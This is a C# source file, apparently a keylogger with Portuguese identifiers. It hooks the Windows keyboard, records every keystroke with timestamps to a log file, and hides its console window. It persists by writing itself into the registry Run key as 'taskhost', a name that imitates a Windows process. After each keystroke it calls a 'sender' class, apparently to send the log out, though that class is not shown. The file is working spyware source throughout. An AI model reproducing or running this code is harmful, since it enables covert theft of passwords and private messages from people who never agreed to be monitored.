using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using taskhost;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string dataSalva;
    private static DateTime agora = DateTime.Now;

    public static void init()
    {
     
        dataSalva = agora.ToString("mm");
        DataInicialDeArquivo();
        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        key.SetValue("taskhost", @"taskhost.exe");
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        sender enviar = new sender();
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            filtro filtro = new filtro();
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);

            if (!filtro.filtrar(vkCode, sw))
            {
                if(!verificaData())
                {
                    string sis = Convert.ToString((Keys)vkCode);
                    sw.Write(sis.ToLower());
                }
                else
                {
                    DateTime now = DateTime.Now;

                    string dataAt = ""; 
                    dataAt =  now.ToString("dd/MM/yyyy HH:mm");
                    string sis = Convert.ToString((Keys)vkCode);
                    sw.WriteLine();
                    sw.Write("[" + dataAt+ "]: " + sis.ToLower());
                    novaData();
                }
            }
            sw.Close();
            enviar.Sender();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }


    public static Boolean verificaData()
    {
        string ultimaData;
        DateTime dat = DateTime.Now;
        ultimaData = dat.ToString("mm");

        if (Convert.ToInt32(ultimaData) == Convert.ToInt32(dataSalva))
        {
            // MessageBox.Show("Data atual: " + ultimaData + " Data Anterior: " + dataSalva);
            novaData();
            return false;
        }
        else
        {
            return true;
        }

    }

    public static void DataInicialDeArquivo()
    {
        StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
        sw.WriteLine();
        sw.Write("[" + agora.ToString("dd/MM/yyyy HH:mm") + "]: ");
        sw.Close();
    }
    public static void novaData()
    {
        dataSalva = "";
        DateTime neDat = DateTime.Now;
        dataSalva = neDat.ToString("mm");
        
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    const int SW_HIDE = 0;

}
